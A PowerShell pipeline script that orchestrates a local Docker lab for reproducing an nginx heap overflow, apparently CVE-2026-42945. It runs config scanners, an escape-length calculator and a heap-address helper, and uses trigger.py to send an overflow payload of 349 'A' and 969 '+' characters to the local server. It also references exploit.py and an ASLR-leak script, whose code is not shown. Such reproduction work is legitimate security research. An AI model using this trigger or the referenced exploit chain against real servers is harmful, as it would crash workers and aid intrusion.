# run_all.ps1 — Complete CVE-2026-42945 Pipeline (PowerShell)
# Runs every script in ./scripts/ in dependency order.
param(
    [switch]$SkipDocker,
    [switch]$Quick
)

$Root = Split-Path -Parent $PSCommandPath
$Scripts = Join-Path $Root "scripts"
$EnvDir  = Join-Path $Root "env"
$Results = Join-Path $Root "results"
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$null = New-Item -ItemType Directory -Path $Results -Force

# Counters
$Global:Pass = 0; $Global:Fail = 0; $Global:Skip = 0

function Pass($msg) { Write-Host "  [PASS] $msg" -ForegroundColor Green; $Global:Pass++ }
function Fail($msg) { Write-Host "  [FAIL] $msg" -ForegroundColor Red;   $Global:Fail++ }
function Skip($msg) { Write-Host "  [SKIP] $msg" -ForegroundColor Yellow; $Global:Skip++ }
function Info($msg) { Write-Host "[INFO] $msg" -ForegroundColor Cyan }

function Run-Py($label, $scriptRelative, [scriptblock]$extra = $null) {
    $scriptPath = Join-Path $Scripts $scriptRelative
    $outFile = Join-Path $Results "$($label -replace ' ','_').txt"
    Info "Running: python3 $scriptRelative"
    if ($extra) {
        $result = & python3 $scriptPath @extra 2>&1
        $rc = $LASTEXITCODE
    } else {
        $result = & python3 $scriptPath 2>&1
        $rc = $LASTEXITCODE
    }
    $result | Out-File -FilePath $outFile -Encoding utf8
    if ($rc -eq 0 -or $rc -eq $null) { Pass $label } else { Fail "$label (exit=$rc)" }
}

function Run-Sh($label, $scriptRelative) {
    $scriptPath = Join-Path $Scripts $scriptRelative
    $outFile = Join-Path $Results "$($label -replace ' ','_').txt"
    Info "Running: bash $scriptRelative"
    $result = & bash $scriptPath 2>&1
    $rc = $LASTEXITCODE
    $result | Out-File -FilePath $outFile -Encoding utf8
    if ($rc -eq 0) { Pass $label } else { Fail "$label (exit=$rc)" }
}

function IsAlive {
    try {
        $r = Invoke-WebRequest -Uri "http://127.0.0.1:19321/" -TimeoutSec 3 -UseBasicParsing
        return $r.StatusCode -eq 200
    } catch { return $false }
}

Write-Host "===================================================" -ForegroundColor Cyan
Write-Host " CVE-2026-42945 — Complete Pipeline (PowerShell)" -ForegroundColor Cyan
Write-Host "===================================================" -ForegroundColor Cyan

# ---- Phase 0 — Preflight ----
Write-Host "`n=== Phase 0 — Preflight Checks ===" -ForegroundColor Cyan
foreach ($cmd in @("python3","curl","docker")) {
    if (Get-Command $cmd -ErrorAction SilentlyContinue) { Pass "$cmd found" } else { Fail "$cmd not found" }
}

# ---- Phase 1 — Syntax (static) ----
Write-Host "`n=== Phase 1 — Syntax Checks ===" -ForegroundColor Cyan
$pyFiles = @(
    "trigger.py","exploit.py","config_scanner.py","escape_calc.py",
    "heap_layout.py","monitor_worker.py","compare_lengths.py",
    "log_parser.py","h2_trigger.py","leak_aslr.py","find_safe_addrs.py",
    "container_scan.py","backport_check.py"
)
foreach ($f in $pyFiles) {
    $path = Join-Path $Scripts $f
    $out = Join-Path $Results "syntax_$f.txt"
    $result = python3 -m py_compile $path 2>&1
    $result | Out-File -FilePath $out -Encoding utf8
    if ($LASTEXITCODE -eq 0) { Pass "syntax $f" } else { Fail "syntax $f" }
}

# ---- Phase 2 — Static Analysis ----
Write-Host "`n=== Phase 2 — Static Analysis ===" -ForegroundColor Cyan
Run-Py "scan_vulnerable" "config_scanner.py" (,@((Join-Path $Root "configs/vulnerable.conf")))
Run-Py "scan_safe"       "config_scanner.py" (,@((Join-Path $Root "configs/safe.conf")))
Run-Py "scan_named"      "config_scanner.py" (,@((Join-Path $Root "configs/named_capture.conf")))
Run-Py "escape_calc"     "escape_calc.py"    (,@("--prefix","349","--plus","969"))
Run-Py "find_safe_addrs" "find_safe_addrs.py" (,@("--heap-base","0x555555659000","--count","5"))

$longStr = "A"*349 + "+"*969
Run-Py "compare_lengths" "compare_lengths.py" (,@("--string",$longStr))

# ---- Phase 3 — Environment ----
if (-not $SkipDocker) {
    Write-Host "`n=== Phase 3 — Environment ===" -ForegroundColor Cyan
    if (IsAlive) {
        Pass "nginx already running"
    } else {
        Info "Building Docker image..."
        Push-Location $EnvDir
        $buildLog = Join-Path $Results "docker_build.txt"
        & docker compose build *>$buildLog
        if ($LASTEXITCODE -eq 0) {
            Pass "docker build"
            Info "Starting containers..."
            $upLog = Join-Path $Results "docker_up.txt"
            & docker compose up -d *>$upLog
            if ($LASTEXITCODE -eq 0) {
                Pass "docker compose up"
                for ($i=1; $i -le 15; $i++) {
                    Start-Sleep -Seconds 1
                    if (IsAlive) { Pass "nginx responsive after ${i}s"; break }
                }
            } else { Fail "docker compose up" }
        } else { Fail "docker build" }
        Pop-Location
    }
}

# ---- Phase 4 — Live Tests ----
Write-Host "`n=== Phase 4 — Live Testing ===" -ForegroundColor Cyan
if (IsAlive) {
    Run-Py "health_check" "trigger.py" (,@("--check-alive"))
    Run-Py "heap_layout"  "heap_layout.py"

    Info "Triggering overflow..."
    Run-Py "trigger_overflow" "trigger.py" (,@("--plus-count","969"))
    Start-Sleep -Seconds 2
    if (IsAlive) { Pass "worker respawned" } else { Fail "worker did not respawn" }
} else {
    Skip "live tests — nginx not running"
}

# ---- Phase 5 — Verification ----
Write-Host "`n=== Phase 5 — Project Verification ===" -ForegroundColor Cyan
Run-Sh "verify_project" "verify_project.sh"

# ---- Summary ----
$Total = $Global:Pass + $Global:Fail + $Global:Skip
Write-Host "`n===================================================" -ForegroundColor Cyan
Write-Host " Pipeline Complete" -ForegroundColor Cyan
Write-Host "   Pass: $($Global:Pass)" -ForegroundColor Green
Write-Host "   Fail: $($Global:Fail)" -ForegroundColor Red
Write-Host "   Skip: $($Global:Skip)" -ForegroundColor Yellow
Write-Host "  Total: $Total" -ForegroundColor White
Write-Host "===================================================" -ForegroundColor Cyan
Write-Host "Results: $Results"

if ($Global:Fail -gt 0) { exit 1 } else { exit 0 }
